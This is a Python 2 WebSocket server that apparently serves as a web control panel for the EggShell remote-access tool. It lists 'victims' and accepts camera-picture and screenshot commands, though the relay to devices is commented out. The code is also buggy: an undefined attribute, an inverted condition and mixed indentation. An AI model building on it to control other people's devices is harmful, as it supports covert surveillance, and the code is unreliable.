#!/usr/bin/env python2.7
# coding:utf-8
import os
import struct
import base64
import hashlib
import socket
import threading
import json
import time

class WsServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port = 8800
        self.buffer_size = 1024
        # self.eggshell = eggshell
        self.ready = False

    def recv_data(self, conn):  # 服务器解析浏览器发送的信息
        try:
            all_data = conn.recv(self.buffer_size)
            if not len(all_data):
                return False
        except:
            pass
        else:
            code_len = ord(all_data[1]) & 127
            if code_len == 126:
                masks = all_data[4:8]
                data = all_data[8:]
            elif code_len == 127:
                masks = all_data[10:14]
                data = all_data[14:]
            else:
                masks = all_data[2:6]
                data = all_data[6:]
            raw_str = ""
            i = 0
            for d in data:
                raw_str += chr(ord(d) ^ ord(masks[i % 4]))
                i += 1
            return raw_str

    def send_data(self, conn, data):  # 服务器处理发送给浏览器的信息
        if data:
            data = str(data)
        else:
            return False
        token = "\x81"
        length = len(data)
        if length < 126:
            token += struct.pack("B", length)  # struct为Python中处理二进制数的模块，二进制流为C，或网络流的形式。
        elif length <= 0xFFFF:
            token += struct.pack("!BH", 126, length)
        else:
            token += struct.pack("!BQ", 127, length)
        data = '%s%s' % (token, data)
        conn.send(data)
        return True

    def handshake(self, conn, address, thread_name):  # 握手建立连接
        headers = {}
        shake = conn.recv(1024)
        if not len(shake):
            return False

        print ('%s : Socket start handshaken with %s:%s' % (thread_name, address[0], address[1]))
        header, data = shake.split('\r\n\r\n', 1)
        for line in header.split('\r\n')[1:]:
            key, value = line.split(': ', 1)
            headers[key] = value

        if 'Sec-WebSocket-Key' not in headers:
            print ('%s : This socket is not websocket, client close.' % thread_name)
            conn.close()
            return False

        MAGIC_STRING = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
        HANDSHAKE_STRING = "HTTP/1.1 101 Switching Protocols\r\n" \
                           "Upgrade:websocket\r\n" \
                           "Connection: Upgrade\r\n" \
                           "Sec-WebSocket-Accept: {1}\r\n" \
                           "WebSocket-Origin: {2}\r\n" \
                           "WebSocket-Location: ws://{3}/\r\n\r\n"

        sec_key = headers['Sec-WebSocket-Key']
        res_key = base64.b64encode(hashlib.sha1(sec_key + MAGIC_STRING).digest())
        str_handshake = HANDSHAKE_STRING.replace('{1}', res_key)
        if 'Origin' in headers:
            str_handshake = str_handshake.replace('{2}', headers['Origin'])
        else:
            str_handshake = str_handshake.replace('{2}', "*")
        if 'Host' in headers:
            str_handshake = str_handshake.replace('{3}', headers['Host'])
        else:
            str_handshake = str_handshake.replace('{3}', "WsServer")


        conn.send(str_handshake)  # 发送建立连接的信息
        print ('%s : Socket handshaken with %s:%s success' % (thread_name, address[0], address[1]))
        print ('Start transmitting data...')
        print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
        return True

    def handle_request(self, conn, address, thread_name):
        self.handshake(conn, address, thread_name)  # 握手
        conn.setblocking(0)  # 设置socket为非阻塞
        self.ready = True

        while True:

            clientdata = self.recv_data(conn)
            # print ">>>>>>>>>>>>handle_request"
            response = {}
            if bool(clientdata) == False:
				
		        try:
		            clientdata = conn.recv(self.buffer_size)
		            print ">>>>>>>>>>>>flase"
		        except:
		            pass
		        else: 
		        	print ">>>>>>>>>>>>else"
		        	break
		        # print ">>>>>>>>>>>>bool"           	
            if clientdata:
            	print "======"
            	print clientdata.decode()
                try:
                    raw_cmd = json.loads(clientdata.decode())
                    id = raw_cmd['id']
                    cmd = raw_cmd['cmd']
                    para = raw_cmd['para']
                except:
                    response["status"] = "Fail"
                    response["content_type"] = ""
                    response["content"] = ""
                    self.send_data(conn, json.dumps(response))
                    continue
                if not para:
                    cmd_data = cmd + ' ' + para
                else:
                    cmd_data = cmd
                if cmd == 'exit':
                    break
                elif cmd == "fetch":
                    self.update_info(conn)
                elif cmd == 'picture':
                    # filename = self.eggshell.server.multihandler.interact(id, cmd_data)
                    # if filename:
                    #     response["status"] = "Success"
                    #     response["content_type"] = "file"
                    #     response["content"] = filename
                    #     self.send_data(conn, json.dumps(response))
                    # else:
                    #     response["status"] = "Fail"
                    #     response["content_type"] = ""
                    #     response["content"] = ""
                    #     self.send_data(conn, json.dumps(response))
#                   conn.send(b'picture')
                    print(id, cmd, para)
                elif cmd == 'screenshot':
                    # filename = self.eggshell.server.multihandler.interact(id, cmd_data)
                    # if filename:
                    #     response["status"] = "Success"
                    #     response["content_type"] = "file"
                    #     response["content"] = filename
                    #     self.send_data(conn, json.dumps(response))
                    # else:
                    #     response["status"] = "Fail"
                    #     response["content_type"] = ""
                    #     response["content"] = ""
                    #     self.send_data(conn, json.dumps(response))
#                   conn.send(b'screenshot')
                    print(id, cmd, para)
                else:
                    response["status"] = "Fail"
                    response["content_type"] = ""
                    response["content"] = ""
                    self.send_data(conn, json.dumps(response))
        conn.sendall(b'bye')
        conn.close()
        print "===bye"

    def push_data(self, conn, address, thread_name):
        try:
            self.update_info(conn)
            while True:
                if self.eggshell.server.multihandler.victims_modify:
                    self.update_info(conn)
                else:
                    time.sleep(3)
        except:
            print ("End connection")
            return


    def update_info(self, conn):
        victims = self.eggshell.server.multihandler.victims
        response = {}
        response["status"] = "Success"
        response["content_type"] = "json"
        response["content"] = victims
        self.send_data(conn, json.dumps(response))
        self.eggshell.server.multihandler.victims_modify = False


    def ws_service(self):

        index = 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((self.host, self.port))
        sock.listen(10)

        print ('\r\n\r\nWebsocket server start, wait for connect!')
        print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
        while True:
            connection, address = sock.accept()
            thread_name = 'thread_%s' % index
            print ('%s : Connection from %s:%s' % (thread_name, address[0], address[1]))
            t_listen = threading.Thread(target=self.handle_request, args=(connection, address, thread_name))
            t_listen.start()
            time.sleep(2)
            # t_push = threading.Thread(target=self.push_data, args=(connection, address, thread_name))
            # t_push.start()
            index += 1


if __name__ == "__main__":
    # eggshell = EggShell()
#    eggshell.menu()
    # eggshell.start_multi_handler()
    wsserver = WsServer()
    wsserver.ws_service()